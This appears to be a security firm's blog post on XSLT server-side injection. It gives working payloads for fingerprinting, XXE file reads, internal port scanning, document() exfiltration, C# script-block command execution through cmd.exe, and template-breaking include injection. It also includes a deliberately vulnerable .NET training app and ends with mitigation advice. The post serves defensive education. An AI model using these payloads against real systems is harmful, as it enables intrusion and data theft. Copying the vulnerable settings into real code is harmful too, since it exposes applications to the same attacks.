@@ -1,0 +1,385 @@
+---
+layout: blogpost
+title: "XSLT Server Side Injection Attacks"
+author: "David Turco"
+author_role: ""
+summary: "Extensible Stylesheet Language Transformations (XSLT) vulnerabilities can have serious consequences for the affected applications, often resulting in remote code execution. Examples of XSLT remote code execution vulnerabilities with public exploits are CVE-2012-5357 affecting the .Net Ektron CMS; CVE-2012-1592 affecting Apache Struts 2.0; and CVE-2005-3757 which affected the Google Search Appliance."
+tags: [Vulnerabilities and exploits, Web applications]
+hero_banner: XSLT_Injection_1010_350_75_s_c1.jpg
+---
+{% raw %}
+<article class="article-content">
+<p>From the examples above it is clear that XSLT vulnerabilities have been around for a long time and, although they are less common than other similar vulnerabilities such as XML Injection, we regularly find them in our security assessments. Nonetheless the vulnerability and the exploitation techniques are not widely known. </p>
+<p>In this blog post we present a selection of attacks against XSLT to show the risks of using this technology in an insecure way. </p>
+<p>We demonstrate how it is possible to execute arbitrary code remotely; exfiltrate data from remote systems; perform network scans; and access resources on the victim’s internal network.</p>
+<p>We also make available a simple .NET application vulnerable to the described attacks and provide recommendations on how to mitigate them.</p>
+<h2>What is XSLT</h2>
+<p>XSL (Extensible Stylesheet Language) is a language for transforming XML documents. XSLT stands for XSL Transformations. XSL Transformations are XML documents themselves.</p>
+<p>The result of the transformation can be a different XML document or something else such as an HTML document, a CSV file or a plain text file.</p>
+<p>Common uses of XSLT are transforming data between file formats processed by different applications and as a templating engine. Many “Enterprise” class applications make extensive use of XSLT; for example a multi-tenant invoicing application could allow clients to heavily customise their invoices using XSLT. Clients would be able to change the information displayed in an invoice and its formatting based on their specific needs.</p>
+<p>Other common applications are:</p>
+<ul>
+<li>Reporting functionality</li>
+<li>Exporting of data in various formats</li>
+<li>Printing</li>
+<li>Emailing</li>
+</ul>
+<p>Before describing the attacks, let’s see how the transformations work with a practical example.</p>
+<p>We start with the following XML file that contains a list of fruit names and relative descriptions:<br/>
+ </p>
+<pre class="prettyprint">&lt;?xml version="1.0" ?&gt;
+&lt;fruits&gt;
+  &lt;fruit&gt;
+    &lt;name&gt;Lemon&lt;/name&gt;
+    &lt;description&gt;Yellow and sour&lt;/description&gt;
+  &lt;/fruit&gt;
+  &lt;fruit&gt;
+    &lt;name&gt;Watermelon&lt;/name&gt;
+    &lt;description&gt;Round, green outside, red inside&lt;/description&gt;
+  &lt;/fruit&gt;
+&lt;/fruits&gt;</pre>
+<p>To transform the XML document to a plain text file we could use the following XSL transformation:</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    Fruits:
+    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>The result of applying the transformation to the data is the following plain text file:</p>
+<pre class="prettyprint">Fruits:
+
+      - Lemon: Yellow and sour
+      - Watermelon: Round, green outside, red inside</pre>
+<h2>Exploiting XSLT Server Side Injection</h2>
+<p>In this section we present a methodology to test applications for XSLT vulnerabilities, from discovery to exploitation. In the examples we focus on a vulnerable application that uses Microsoft’s System.Xml XSLT implementation; however similar techniques apply to other common libraries such as Libxslt, Saxon and Xalan.</p>
+<h4>Discovery of Vulnerable Entry Points</h4>
+<p>The first step is to identify the vulnerable parts of the application. </p>
+<p>The simplest case is where the application allows the upload of an arbitrary XSLT file. </p>
+<p>If that’s not the case, a vulnerable application might generate the XSL Transformation’s XML document dynamically using untrusted user input. </p>
+<p>For example the application could generate the following XSLT document, where the string “Your Company Name Here” originates from untrusted user input.</p>
+<pre class="prettyprint">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    Your Company Name Here
+    Fruits:
+    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+  &lt;xsl:include href="external_transform.xslt"/&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>To determine if the application is vulnerable it is sufficient to inject characters that would normally invalidate the syntax of the XML document, such as double quotes, single quotes and angle brackets (”,’,&lt;,&gt;). If the server returns an error then the application is potentially vulnerable. In general the identification techniques are the same techniques used for XML injection vulnerabilities.</p>
+<p>Some of the attacks described later on are only applicable if the injection is located in specific parts of the document; however we’ll show a technique to bypass this limitation using the import and include functionalities.</p>
+<p>To keep things as simple as possible, in the following examples we assume that we can submit an arbitrary XSLT document to the application, unless stated otherwise. </p>
+<h4>Fingerprinting with the system-property() Function</h4>
+<p>Once a vulnerable entry point has been identified it is useful  to fingerprint the system and determine the XSLT implementation in use. Knowing the XSLT library used by the application is of great help when trying to construct an attack payload.</p>
+<p>Different libraries implement different XSLT features and a feature available in one library might not be available in another. Very often proprietary extensions are implemented that are not compatible between libraries. Additionally the default settings widely change between implementations, generally with older libraries having dangerous features enabled by default and newer libraries requiring the developer to explicitly enable them when required. </p>
+<p>The name of the vendor of the library can be retrieved using the “system-property()” function, which is part of the XSLT v1.0 standard and all libraries implement.</p>
+<p>Valid parameters are:</p>
+<ul>
+<li>xsl:vendor</li>
+<li>xsl:vendor-url</li>
+<li>xsl:version</li>
+</ul>
+<p>The following transformation can be used to determine the “vendor” of the library:</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+	&lt;xsl:value-of select="system-property('xsl:vendor')"/&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>In our case, because we are testing against the Microsoft .Net System.xml implementation, the value returned is “Microsoft”:</p>
+<pre class="prettyprint">Microsoft</pre>
+<h4>Data Exfiltration and Port Scanning with XML External Entities (XXE)</h4>
+<p>Considering that the document format for XSLT is XML, it is not surprising that common XML attacks such as the billion loughs attack  (also known as XML bombs) and the XML External Entity attack also work against XSLT. The billion loughs attack is a Denial of Service attack, which aims at exhausting the memory resources on the server; however for the purposes of this article we are more interested in the XML External Entity attacks. </p>
+<p>In the following example we use an external entity to read the contents of the “C:\secretfruit.txt” file.</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;]&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    Fruits &amp;ext_file;:
+    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+
+&lt;/xsl:stylesheet&gt;</pre>
+<p>The ENTITY element places the content of the file in the “ext_file” reference, which we then print inside the main document using the syntax “&amp;ext_file;”. The output reveals the secret contents of the file which is “Golden Apple”:</p>
+<pre class="prettyprint">Fruits Golden Apple:
+
+      - Lemon: Yellow and sour
+      - Watermelon: Round, green outside, red inside</pre>
+<p>This technique can be used to retrieve files stored locally on the web server and web pages hosted on internal systems that would normally not be directly accessible by the attacker. This could be configuration files containing credentials or files containing other sensitive information.</p>
+<p>Files can also be retrieved using UNC paths (\\servername\share\file) and URLs (http://servername/file) instead of file paths, allowing the attacker to retrieve files hosted by other systems on the victim’s internal network.</p>
+<p>By using a list of IP addresses and port numbers it is also possible to determine if a remote port is open or closed depending on the application response. For instance the application can display different error messages or introduce time delays in the response.</p>
+<p>The following XSLT transformation uses the URL http://172.16.132.1:25 instead of a local file path as used in the previous example:</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "http://172.16.132.1:25"&gt;]&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    Fruits &amp;ext_file;:
+    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+
+&lt;/xsl:stylesheet&gt;</pre>
+<p>The following screenshot shows the error returned by the application when attempting to connect to the URL. The error message discloses that port 25 is closed.</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/XSLT_1_800_188_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/XSLT_1_800_188_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20201112021416/https://www.contextis.com/media/images/content/XSLT_1.png"></a>
+<a class="modal-img visible-xs" href="/web/20201112021416/https://www.contextis.com/media/images/content/XSLT_1.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>When using the URL http://172.16.132.1:1234 the error message is different which indicates that port 1234 is open.</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/XSLT_2_800_235_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/XSLT_2_800_235_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20201112021416/https://www.contextis.com/media/images/content/XSLT_2.png"></a>
+<a class="modal-img visible-xs" href="/web/20201112021416/https://www.contextis.com/media/images/content/XSLT_2.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>Attackers can use this technique to perform reconnaissance scans of the victim’s internal network.</p>
+<h4>Data Exfiltration and Port Scanning with the document() Function</h4>
+<p>The document function allows XSLT transformations to access data stored in external XML documents other than the main data source.</p>
+<p>The function can be abused to read files on a remote system by copying the entire content in the result of the transformation. The file needs to be a well-formed XML document, but that’s not always an issue because very often sensitive information is stored in XML files. For instance, on an ASP.NET web application the web.config file is a good candidate as it could contain the database credentials.</p>
+<p>Let’s see an example of its usage. The following transformation can be used to exfiltrate the contents of the file “C:\secrectfruit.xml”:</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    &lt;xsl:copy-of select="document('C:\secretfruit.xml')"/&gt;
+    Fruits:
+	    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>The result of the transformation shows the contents of the secret file at the top:</p>
+<pre class="prettyprint">&lt;fruits&gt;
+  &lt;fruit&gt;
+    &lt;name&gt;Golden Apple&lt;/name&gt;
+    &lt;description&gt;Round, made of Gold&lt;/description&gt;
+  &lt;/fruit&gt;
+&lt;/fruits&gt;
+    Fruits:
+
+      - Lemon: Yellow and sour
+      - Watermelon: Round, green outside, red inside</pre>
+<p>Similarly to the XXE attack, the “document()” function can be used to retrieve documents from remote systems and to perform basic network scans using a UNC path or a URL as shown in the following transformation:</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    &lt;xsl:copy-of select="document('http://172.16.132.1:25')"/&gt;
+    Fruits:
+	    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<h4>Remote Code Execution with Embedded Script Blocks</h4>
+<p>Embedded script blocks are proprietary XSLT extensions that allow the inclusion of code directly within the XSLT document. In Microsoft’s implementation, for instance, C# code can be included. When the document is parsed, the code is compiled and executed by the remote server.</p>
+<p>The following XSLT document is a proof of concept that lists all files in the current working directory.</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="urn:my-scripts"&gt;
+
+&lt;msxsl:script language = "C#" implements-prefix = "user"&gt;
+&lt;![CDATA[
+public string execute(){
+System.Diagnostics.Process proc = new System.Diagnostics.Process();
+proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
+proc.StartInfo.RedirectStandardOutput = true;
+proc.StartInfo.UseShellExecute = false;
+proc.StartInfo.Arguments = "/c dir";
+proc.Start();
+proc.WaitForExit();
+return proc.StandardOutput.ReadToEnd();
+}
+]]&gt;
+&lt;/msxsl:script&gt;
+
+  &lt;xsl:template match="/fruits"&gt;
+  --- BEGIN COMMAND OUTPUT ---
+	&lt;xsl:value-of select="user:execute()"/&gt;
+  --- END COMMAND OUTPUT ---	
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>First we define two new XML prefixes inside the “xsl:stylesheet” tag. The first one “xmlns:msxsl” is required to enable Microsoft’s proprietary schema extensions, the second one “xmlns:user” declares a custom user extension that is implemented by the “msxsl:script” script block.</p>
+<p>The C# code implements the “execute()” function that executes the command “cmd.exe /c dir” and returns the command output as a string. Finally the function is called inside the “xsl:value-of” tag. </p>
+<p>The result of the transformation is the output of the command “dir”:</p>
+<pre class="prettyprint">--- BEGIN COMMAND OUTPUT ---
+         Volume in drive C has no label.
+ Volume Serial Number is EC7C-74AD
+
+ Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole
+Application\XsltConsoleApplication\bin\Debug
+
+22/02/2017  15:19    &lt;DIR&gt;          .
+22/02/2017  15:19    &lt;DIR&gt;          ..
+22/02/2017  13:30               258 data.xml
+22/02/2017  14:48               233 external_transform.xslt
+22/02/2017  15:15                12 secretfruit.txt
+31/01/2017  13:45               154 secretfruit.xml
+22/02/2017  15:29               831 transform.xslt
+22/02/2017  13:49             7,168 XsltConsoleApplication.exe
+26/01/2017  15:42               189 XsltConsoleApplication.exe.config
+22/02/2017  13:49            11,776 XsltConsoleApplication.pdb
+               8 File(s)         20,621 bytes
+               2 Dir(s)   9,983,107,072 bytes free
+
+  --- END COMMAND OUTPUT ---</pre>
+<h4>Import and Include to the Rescue</h4>
+<p>The import and include tags can be used to combine multiple XSLT documents. If we are in a situation where we can only inject in the middle of an XSLT document, then it is not possible to directly use the XML External Entity attack or the include scripts because they require injections at the very top of the document.</p>
+<p>The import and include functionalities can be used to overcome such limitation by combining the XSLT document with an external document. When the external file is loaded the entire document is parsed and if the attacker has control over it they can use both XML External Entities and embedded scripts in the external file.</p>
+<p>The external file could be a file previously uploaded on the server, the extension doesn’t matter as long as the content is XML, or a file hosted on the attacker’s machine referenced using a URL.</p>
+<p>The “xsl:import” tag can only be used as the first child of the “xsl:stylesheet” tag while the “xsl:include” tag can be used in other positions.</p>
+<p>Let’s take the same XSLT document we used before, where we assumed we could only inject in the “Your Company Name Here” string:</p>
+<pre class="prettyprint">&lt;?xml version=”1.0” encoding=”utf-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    Your Company Name Here
+    Fruits:
+	    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+  &lt;xsl:include href="external_transform.xslt"/&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>We want to include the following external XSLT file named “external_transform.xslt”. To keep things simple the external transformation only prints a brief message; however the external transformation can be replaced with any of the attacks described earlier including the ones that require a declaration at the top of the document, such as the embedded script blocks which cannot be directly injected in the above transformation.</p>
+<pre class="prettyprint">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+    &lt;xsl:template match="/"&gt;
+	 Hello from the external transformation
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>To include the external document we need to inject the following tag:</p>
+<pre class="prettyprint">&lt;xsl:include href="external_transform.xslt"/&gt;</pre>
+<p>However there is a problem: the “xsl:include” tag can’t be included in an “xsl:template” tag and the resulting file has to be a well-formed XML document. So we first need to close the “xsl:template” tag, then we can add the “xsl:include” tag, which satisfies the first requirement. To obtain a well-formed XML file we need to reopen the “xsl:template” tag, after the “xsl:include” tag.</p>
+<p>The resulting payload is:<br/>
+ </p>
+<pre class="prettyprint">&lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;</pre>
+<p>After injection, the resulting XSLT document looks like this:</p>
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:template match="/fruits"&gt;
+    &lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;
+    Fruits:
+    &lt;!-- Loop for each fruit --&gt;
+    &lt;xsl:for-each select="fruit"&gt;
+      &lt;!-- Print name: description --&gt;
+      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
+    &lt;/xsl:for-each&gt;
+  &lt;/xsl:template&gt;
+  &lt;xsl:include href="external_transform.xslt"/&gt;
+&lt;/xsl:stylesheet&gt;</pre>
+<p>The transformation would then produce the following output:</p>
+<pre class="prettyprint">Hello from the external transformation</pre>
+<p>As with XXE and with the “document()” function, the “import” and “include” tags can be used both to exfiltrate data and as a basic port scanner.</p>
+<h2>XSLT Very Vulnerable App</h2>
+<p>After identifying an XSLT vulnerability, it can be tricky to write a working exploit. This is in part because of the strict syntax validation required by XML, in part because of the application specific implementation details.</p>
+<p>It’s useful to have a way to quickly test the payloads against a transparent implementation. </p>
+<p>For this reason I wrote a small vulnerable .Net console application that can be used to test the attacks described earlier. The application uses .Net’s System.Xml implementation.<br/>
+The full code with comments is reported below. It can be compiled using Microsoft Visual Studio. The code and the compiled version of the application can be downloaded <a href="https://github.com/ctxis/VulnerableXsltConsoleApplication">here</a>. </p>
+<pre class="prettyprint">using System;
+using System.Xml;
+using System.Xml.Xsl;
+
+namespace XsltConsoleApplication
+{
+    class Program
+    {
+        /*
+        This code contains serious vulnerabilities and is provided for training purposes only!
+        DO NOT USE ANYWHERE FOR ANYTHING ELSE!!!
+        */
+        static void Main(string[] args)
+        {
+            Console.WriteLine("\n#####################################################################");
+            Console.WriteLine("#                                                                   #");
+            Console.WriteLine("# This is a Vulnerable-by-Design application to test XSLT Injection #");
+            Console.WriteLine("#                                                                   #");
+            Console.WriteLine("#####################################################################\n");
+            Console.WriteLine("The application expects (in the current working directory):");
+            Console.WriteLine(" - an XML file (data.xml) and\n - an XSLT style sheet (transform.xslt)\n");
+            Console.WriteLine("===================================================================");
+
+            String transformationXsltFileURI = "transform.xslt";
+            String dataXMLFileURI = "data.xml";
+
+            // Enable DTD processing to load external XML entities for both the XML and XSLT file
+            XmlReaderSettings vulnerableXmlReaderSettings = new XmlReaderSettings();
+            vulnerableXmlReaderSettings.DtdProcessing = DtdProcessing.Parse;
+            vulnerableXmlReaderSettings.XmlResolver = new XmlUrlResolver();
+            XmlReader vulnerableXsltReader = XmlReader.Create(transformationXsltFileURI, vulnerableXmlReaderSettings);
+            XmlReader vulnerableXmlReader = XmlReader.Create(dataXMLFileURI, vulnerableXmlReaderSettings);
+
+            XsltSettings vulnerableSettings = new XsltSettings();
+            // Embedded script blocks and the document() function are NOT enabled by default
+            vulnerableSettings.EnableDocumentFunction = true;
+            vulnerableSettings.EnableScript = true;
+            // A vulnerable settings class can also be created with:
+            // vulnerableSettings = XsltSettings.TrustedXslt;
+
+            XslCompiledTransform vulnerableTransformation = new XslCompiledTransform();
+            // XmlUrlResolver is the default resolver for XML and XSLT and supports the file: and http: protocols
+            XmlUrlResolver vulnerableResolver = new XmlUrlResolver();
+            vulnerableTransformation.Load(vulnerableXsltReader, vulnerableSettings, vulnerableResolver);  
+
+            XmlWriter output = new XmlTextWriter(Console.Out);
+
+            // Run the transformation
+            vulnerableTransformation.Transform(vulnerableXmlReader, output);   
+
+        }
+    }
+}</pre>
+<p>The application expects a data.xml and transformation.xslt files in the current working directory.</p>
+<h2>Recommendations </h2>
+<p>If your application makes use of XSLT you can mitigate the risks by following these guidelines:</p>
+<ul>
+<li>Where possible avoid user-provided XSLT documents;</li>
+<li>Do not generate XSLT documents from untrusted input, for instance by concatenating strings. If a non-static value is required it should be included in the XML data file and only referenced by the XSLT document;</li>
+<li>Explicitly disable dangerous functionality implemented by the XSLT library in use. Libraries often use unsafe defaults. Check in the library’s documentation how to disable: XML External Entities; the “document()” function; the import and include tags. Ensure that embedded scripting extensions are disabled and that other proprietary extensions that allow reading or writing external files are also disabled.</li>
+</ul>
+<p>The following document by Emanuel Duss and Roland Bischofberger contains an overview of the functionalities implemented by popular XSLT libraries and their defaults settings. Page 34 includes a handy comparison table to use as a starting point.<br/>
+https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf. </p>
+<h2>Summary and Conclusions</h2>
+<p>XSLT is a powerful tool used by many applications but its weaknesses are not widely understood. Poor coding practices introduce vulnerabilities that can be exploited to take full control of applications and exfiltrate data.<br/>
+This article contributes to raise awareness by showing possible attack vectors and providing guidelines to avoid common implementation pitfalls.</p>
+<h2>Contact and Follow-Up</h2>
+<p>David is part of our Assurance team in Context's London office. He’s been working for Context for over a year performing web, mobile and infrastructure assessments. He has a particular interest in open source technologies and is a keen motorcyclist.</p>
+</article>
+{% endraw %}
